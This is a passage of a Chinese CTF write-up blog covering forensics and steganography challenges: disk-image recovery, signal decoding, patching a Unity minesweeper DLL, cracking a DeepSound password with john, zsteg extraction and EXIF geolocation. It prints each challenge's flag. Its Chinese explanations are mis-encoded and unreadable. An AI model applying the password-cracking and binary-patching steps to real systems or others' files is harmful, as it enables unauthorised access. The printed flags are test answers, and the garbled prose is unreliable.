&quot;mmmm&quot; #m&quot;&quot;#m #&quot;  #  #&quot; &quot;#  #&quot; &quot;#  #&quot; &quot;#    #   </span><br><span class="line">#   #  #   #   &quot;&quot;&quot; # #    # #   &quot;# #    # #&quot;&quot;&quot;&quot;  #   #  #   #  #   #    #   </span><br><span class="line">&quot;#m##  ##m#&quot;  &quot;mmm&quot;   #mm#  &quot;#mmm&quot;  #mm#&quot; &quot;#mm&quot;  ##m#&quot;  ##m#&quot;  ##m#&quot;  mm#mm </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line"> mmmm  mmmmm      #    mmm  &quot;&quot;m                                             </span><br><span class="line">#&quot;  &quot;m #       mmm#  m&quot;   &quot;   #                                             </span><br><span class="line">#m  m# &quot;&quot;&quot;&quot;mm #&quot; &quot;#  #m&quot;&quot;#m   &quot;mm                                           </span><br><span class="line"> &quot;&quot;&quot; #      # #   #  #    #   #                                             </span><br><span class="line">&quot;mmm&quot;  &quot;mmm#&quot; &quot;#m##   #mm#&quot;   #                                             </span><br><span class="line">                            &quot;&quot;                                              </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a273fdedf3d746e97db9086ebbb195d6&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018æ’ä½èµ›-file"><a href="#XMAN2018æ’ä½èµ›-file" class="headerlink" title="[XMAN2018æ’ä½èµ›]file"></a>[XMAN2018æ’ä½èµ›]file</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ªé•œåƒï¼Œä½¿ç”¨ DiskInternals Linux Reader æŒ‚è½½æ‰“å¼€å¯ä»¥å‘ç°ä¸€ä¸ª lost+found æ–‡ä»¶å¤¹ï¼Œè¯´æ˜å­˜åœ¨å¯èƒ½å¯æ¢å¤çš„æ–‡ä»¶æ•°æ®ç¢ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618503187703/8fd9dca120e1ab04cc09bcbcddf3d10a1a2216eb.png"></p><p>ä½¿ç”¨ <code>extundelete attachment.img --restore-all</code> å°è¯•æ¢å¤å³å¯å¾—åˆ°ä¸€ä¸ª Vim çš„ swp æ–‡ä»¶ã€‚å°†å…¶æ¢å¤åæ•´ç†å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fugly_cats_need_luv_2&#125;</span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-ä¿¡å·åˆ†æ"><a href="#HDCTF2019-ä¿¡å·åˆ†æ" class="headerlink" title="[HDCTF2019]ä¿¡å·åˆ†æ"></a>[HDCTF2019]ä¿¡å·åˆ†æ</h3><blockquote><p>ä½¿ç”¨HackCube-Specialåˆ†æå›ºå®šç ä¿¡å·ï¼š<a href="https://www.freebuf.com/articles/wireless/191534.html">https://www.freebuf.com/articles/wireless/191534.html</a></p></blockquote><p>å°†é™„ä»¶ä½¿ç”¨ Audition æ‰“å¼€å¯ä»¥çœ‹åˆ°å¦‚ä¸‹é‡å¤æ³¢å½¢ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618507217657/744aad767e7ff22b3c3e9f1816def3130c733761.png"></p><p>æ ¹æ®å‚è€ƒæ–‡ç« çš„å¦‚ä¸‹å›¾ç‰‡å¯ä»¥å°è¯•è§£ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618507302968/d7b7cff9ac0bef89dd43ddbf37ecd407008cbb45.png"></p><p>æ ¹æ®å›¾ç‰‡è§„å¾‹å¯è§£ç å¾—åˆ° <code>FFFFFFFF0001</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FFFFFFFF0001&#125;</span><br></pre></td></tr></table></figure><h3 id="De1CTF2019-Mine-Sweeping"><a href="#De1CTF2019-Mine-Sweeping" class="headerlink" title="[De1CTF2019]Mine Sweeping"></a>[De1CTF2019]Mine Sweeping</h3><p>è§£å‹é™„ä»¶å¯å¾—åˆ°ä¸€ä¸ªæ¸¸æˆï¼Œä½¿ç”¨ dnSpy æŸ¥çœ‹ <code>Assembly-CSharp.dll</code> å¯ä»¥æ‰¾åˆ° <code>OnMouseUpAsButton()</code> æ–¹æ³•ï¼Œå…¶ä¸­å­˜åœ¨ç€åˆ¤æ–­æ¯æ¬¡ç‚¹å‡»æ˜¯å¦â€œè¸©é›·â€çš„æ“ä½œã€‚è¦å®Œæˆæ¸¸æˆåªéœ€è¦ç‚¹å¼€æ‰€æœ‰æ–¹å—å³å¯ï¼Œå› æ­¤åªéœ€è¦æŠŠâ€œè¸©é›·â€å»æ‰ã€‚å°†åŸæœ‰çš„ä»£ç ä¿®æ”¹å¦‚ä¸‹ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Elements</span></span><br><span class="line"><span class="comment">// Token: 0x0600000A RID: 10</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseUpAsButton</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!Grids._instance.bGameEnd &amp;&amp; !<span class="keyword">this</span>.bIsOpen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bIsOpen = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">int</span> num = (<span class="built_in">int</span>)<span class="keyword">base</span>.transform.position.x;</span><br><span class="line"><span class="built_in">int</span> num2 = (<span class="built_in">int</span>)<span class="keyword">base</span>.transform.position.y;</span><br><span class="line"><span class="built_in">int</span> adjcent = Grids._instance.CountAdjcentNum(num, num2);</span><br><span class="line"><span class="keyword">this</span>.SafeAndThunder(adjcent);</span><br><span class="line">Grids._instance.Flush(num, num2, <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">29</span>, <span class="number">29</span>]);</span><br><span class="line"><span class="keyword">if</span> (Grids._instance.GameWin())</span><br><span class="line">&#123;</span><br><span class="line">Grids._instance.bGameEnd = <span class="literal">true</span>;</span><br><span class="line">MonoBehaviour.print(<span class="string">&quot;game over: win&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åä¿å­˜ï¼Œå†æ¬¡æ‰“å¼€æ¸¸æˆå¹¶ç‚¹å¼€æ‰€æœ‰æ–¹å—å³å¯å¾—åˆ°å¦‚ä¸‹äºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618558212529/5018a4be2b010ac4b82809c47f6282cac0ca1427.png@300w"></p><p>æ‰«æäºŒç»´ç å¯å¾—åˆ° <code>http://qr02.cn/FeJ7dU</code>ï¼Œè®¿é—®å³å¯è·å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de1ctf&#123;G3t_F1@g_AFt3R_Sw3ep1ng_M1n3s&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-not-so-deep"><a href="#INSHack2018-not-so-deep" class="headerlink" title="[INSHack2018](not) so deep"></a>[INSHack2018](not) so deep</h3><p>ä½¿ç”¨ Audition æ‰“å¼€é™„ä»¶å¯ä»¥å‘ç°åŠä¸ª flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559097680/2d01f9162a4b68c8a2610f15937f58561a786778.png"></p><p>æ ¹æ®å…¶ä¸­å«æœ‰çš„ st3G4n æ¨æµ‹æ˜¯éšå†™ï¼ŒåŒæ—¶é¢˜ç›®ä¸­æœ‰ deepï¼Œè€ƒè™‘æ˜¯ DeepSoundã€‚ä½†æ˜¯æ²¡æœ‰ç»™å‡º keyï¼Œå› æ­¤å°è¯•ä½¿ç”¨ john è‡ªå¸¦çš„ deepsound2john.py æ¥å¾—åˆ° hash å€¼ä»è€Œçˆ†ç ´ keyã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; python .\run\deepsound2john.py .\final_flag.wav</span><br><span class="line">final_flag.wav:$dynamic_1529<span class="variable">$b8f858d9deb0b805797cef03299e3bdd8990f48a</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ john çˆ†ç ´å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">azerty           (final_flag.wav)</span><br></pre></td></tr></table></figure><p>å› æ­¤å¾—åˆ°äº† key ä¸º azertyã€‚ä½¿ç”¨ DeepSound é…åˆ key è§£å¯†å¯å¾—ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559638907/05db2068ee3850ca47334f5f4a409f243230c0e7.png"></p><p>æå–å‡º flag2.txt å¯å¾—åä¸€åŠ flag <code>0_1s_4lwayS_Th3_S4me&#125;</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Aud1o_st3G4n0_1s_4lwayS_Th3_S4me&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-diskimage"><a href="#BSidesSF2019-diskimage" class="headerlink" title="[BSidesSF2019]diskimage"></a>[BSidesSF2019]diskimage</h3><p>é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä¸ŠåŠéƒ¨åˆ†æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œè€ƒè™‘æœ‰éšå†™ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559941227/a75a5eb87399e52e8c3978f4f2f106075975fd39.png@50q" alt="image-20210416155900562"></p><p>åœ¨ zsteg çš„æŠ¥å‘Šä¸‹æœ‰å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8,rgb,lsb,xy       .. file: DOS&#x2F;MBR boot sector, code offset 0x3c+2, OEM-ID &quot;~mitsumi&quot;, root entries 224, sectors 2880 (volumes &lt;&#x3D;32 MB) , sectors&#x2F;FAT 9, sectors&#x2F;track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit)</span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶æå–å‡ºæ¥ <code>zsteg -e &#39;b8,rgb,lsb,xy&#39; attachment.png  &gt; extracted.dat </code>ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªè½¯ç›˜æ•°æ®æ–‡ä»¶ã€‚ä½¿ç”¨ testdisk æŒ‡ä»¤å°è¯•æ¢å¤è¢«åˆ é™¤çš„æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561398231/18575ce83e848c1b7f9555d8882a50979c8bff60.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561429297/6f97bc81c2552c5f67ac73114024f88ba8541841.png" alt="image-20210416162348906"></p><p>åœ¨æ­¤ç•Œé¢æ—¶æŒ‰ c å°†æ–‡ä»¶æ‹·è´åˆ°è½¯ç›˜æ•°æ®æ–‡ä»¶çš„ç›®å½•ä¸‹ã€‚æ¢å¤å¾—åˆ°çš„ <code>_LAG.ICO</code> å¦‚ä¸‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561604774/22466738c5a2cbadcf93c182b6916bb57451238d.png" alt="image-20210416162644470"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;FAT12_FTW&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2020-barcoder"><a href="#BSidesSF2020-barcoder" class="headerlink" title="[BSidesSF2020]barcoder"></a>[BSidesSF2020]barcoder</h3><p>ç”»å›¾ä¸€æŠŠæ¢­ä¿®å¤æ¡å½¢ç ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563141840/633accf5b07c432c1b938968757349cb312f2140.png@200w"></p><p>ä½¿ç”¨ bcTester æ‰«ææ¡å½¢ç å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563187108/fe4e0d8dcf8c4216a25ef18c259c1aef9acdb7cb.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;way_too_common&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-Kadyrovâ€™s-Cat"><a href="#CFI-CTF-2018-Kadyrovâ€™s-Cat" class="headerlink" title="[CFI-CTF 2018]Kadyrovâ€™s Cat"></a>[CFI-CTF 2018]Kadyrovâ€™s Cat</h3><blockquote><p>A man from the soviet union has sent you two strange documents. Find the identity of the man as well as his location.</p><p>Flag format is : <code>CFI&#123;Firstname_Lastname_of_City&#125;</code></p></blockquote><p>é™„ä»¶ä¸­çš„å›¾ç‰‡æœ‰ç»çº¬åº¦ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563867205/622fdd3c8f0530f330d67eef1163981be78ff1aa.png"></p><p>ç¨å¾®è®¡ç®—ä¸€ä¸‹å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618564139558/fd5e6700771dfd06a65308543ef08549dd8d8951.png"></p><p>ä½¿ç”¨åœ°å›¾å¯ä»¥å¾—åˆ°åœ°å€ <code>Uzvaras bulvÄris, Centra rajons, RÄ«ga, LV-1050, Latvia</code>ï¼Œå› æ­¤åŸå¸‚æ˜¯ Rigaã€‚</p><p>ä½¿ç”¨ Acrobat DC æ‰“å¼€é™„ä»¶ç»™å‡ºçš„ PDF æ–‡ä»¶å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618564527199/91a853ea64b19d1d38516c8e0e80abd85ada7ff4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;Kotik_Kadyrov_of_Riga&#125;</span><br></pre></td></tr></table></figure><h3 id="Weird-List"><a href="#Weird-List" class="headerlink" title="Weird_List"></a>Weird_List</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€å †æ•°æ®ï¼Œæ¨æµ‹å…¶æ„æˆäº†ä¸€å¹…å›¾ç‰‡ã€‚å› æ­¤å†™ä¸ªè„šæœ¬å°†æ•°æ®ç”»å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"></span><br><span class="line">pixels = [[<span class="number">120</span>], [<span class="number">120</span>], [<span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, 